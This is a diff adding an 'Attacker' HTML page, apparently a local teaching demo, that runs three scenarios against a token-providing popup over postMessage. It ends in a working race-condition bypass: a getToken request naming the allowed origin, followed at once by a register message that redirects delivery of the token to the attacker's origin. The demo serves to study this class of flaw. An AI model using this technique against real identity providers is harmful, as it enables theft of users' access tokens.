@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>😈 Attacker</title>
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 780px; margin: 32px auto; padding: 0 16px; color: #1a1a1a; }
+  h1 { font-size: 20px; } h3 { font-size: 14px; margin: 18px 0 6px; }
+  .box { background:#f5f5f7; border-radius:10px; padding:14px 16px; margin:12px 0; }
+  code { background:#e8e8ea; padding:2px 5px; border-radius:4px; }
+  button { font-size:14px; padding:9px 15px; border:0; border-radius:8px; background:#1a1a1a; color:#fff; cursor:pointer; margin:4px 6px 4px 0; }
+  button.hot { background:#c92a2a; }
+  #out { background:#0b0b0d; color:#ddd; font-family: ui-monospace, monospace; font-size:13px;
+         padding:12px; border-radius:8px; min-height:150px; white-space:pre-wrap; line-height:1.5; }
+  .tok { color:#7CFC98; } .err { color:#ff6b6b; } .dim { color:#888; } .step { color:#8ab4ff; }
+</style>
+</head>
+<body>
+  <h1>😈 Attacker <small class="dim">(http://localhost:4000 — NOT the allowed origin)</small></h1>
+  <div class="box">
+    The provider hands its token only to <b>http://localhost:5000</b>. We are
+    <b>http://localhost:4000</b>. Three scenarios — watch the log and the provider popup:
+    <h3>1) Ask directly with our own origin</h3>
+    <button onclick="run('direct')">getToken(appOrigin = 4000)</button>
+    <span class="dim">→ provider refuses (origin not allowed)</span>
+    <h3>2) Ask with the allowed origin, but no race</h3>
+    <button onclick="run('norace')">getToken(appOrigin = 5000)</button>
+    <span class="dim">→ check passes, but the browser won't deliver a 5000-addressed token to us</span>
+    <h3>3) Combine with a race condition</h3>
+    <button class="hot" onclick="run('race')">getToken(5000) + register(4000)</button>
+    <span class="dim">→ validated as 5000, destination swapped to 4000 before the send</span>
+  </div>
+  <div class="box"><b>Log</b><div id="out">idle…</div></div>
+
+<script>
+const PROVIDER = "http://localhost:3000";
+const PARTNER  = "http://localhost:5000";   // the allowed origin
+const ME       = location.origin;           // http://localhost:4000
+const POPUP_KEEP_MS = 7000;                 // keep the popup open this long to read its log
+let popup, mode, state, got;
+
+function out(msg, cls){ const e=document.getElementById("out"); const s=document.createElement("span");
+  if(cls) s.className=cls; s.textContent=msg+"\n"; e.appendChild(s); }
+
+window.addEventListener("message", (event) => {
+  if (event.origin !== PROVIDER) return;
+  let d; try { d = JSON.parse(event.data); } catch { return; }
+  if (!d) return;
+
+  if (d.type === "provider_ready") {
+    out("popup is ready. allowed origin on the provider = " + PARTNER, "dim");
+
+    if (mode === "direct") {
+      out("① send → getToken { appOrigin: " + ME + " }", "step");
+      out("   we ask with OUR origin; the provider will check it against its allowlist.", "dim");
+      popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: ME, state }), "*");
+    }
+    else if (mode === "norace") {
+      out("① send → getToken { appOrigin: " + PARTNER + " }", "step");
+      out("   the check will PASS, so the provider sends the token with targetOrigin = " + PARTNER + ".", "dim");
+      out("   but our window is " + ME + ", so the browser should refuse to deliver it to us.", "dim");
+      popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: PARTNER, state }), "*");
+    }
+    else if (mode === "race") {
+      out("① send → getToken { appOrigin: " + PARTNER + " }", "step");
+      out("   the provider stores k = " + PARTNER + " and starts a REAL async origin check.", "dim");
+      out("   ⟳ while it waits for that round-trip, the server is 'busy' — this is the gap.", "dim");
+      popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: PARTNER, state }), "*");
+      out("② send → register { appOrigin: " + ME + " }   (fired immediately)", "step");
+      out("   this lands DURING the gap and overwrites the destination: k = " + ME + ".", "dim");
+      out("   the check passed for " + PARTNER + ", but the token will be sent to k = " + ME + ".  ← bypass", "dim");
+      popup.postMessage(JSON.stringify({ type:"register", appOrigin: ME }), "*");
+    }
+
+    out("…waiting for whatever the browser actually delivers to " + ME, "dim");
+    setTimeout(() => {
+      if (!got) out("✗ nothing was delivered to " + ME + ".   (state " + state + ")", "err");
+    }, 1500);
+    setTimeout(() => { try { popup && popup.close(); } catch(e){} out("(popup closed)", "dim"); }, POPUP_KEEP_MS);
+    return;
+  }
+
+  if (d.token) {   // a real message the browser actually delivered to us
+    got = true;
+    out("✓ RECEIVED at " + ME + " →  token=" + d.token + "   state=" + d.state, "tok");
+    out("  (the popup stays open a few seconds — read its log to see k change)", "dim");
+  }
+}, false);
+
+function run(which){
+  mode = which; got = false;
+  state = "st_" + Math.random().toString(36).slice(2, 8);
+  document.getElementById("out").textContent = "";
+  try { popup && popup.close(); } catch(e){}
+  const target = PROVIDER + "/";
+  out("opening popup →  " + target, "step");
+  out("  (the provider page runs at origin " + PROVIDER + "; it stays open ~" + (POPUP_KEEP_MS/1000) + "s)", "dim");
+  popup = window.open(target, "provider", "width=540,height=440");
+  if (!popup) out("✗ popup blocked — allow pop-ups for localhost and retry.", "err");
+}
+</script>
+</body>
+</html>
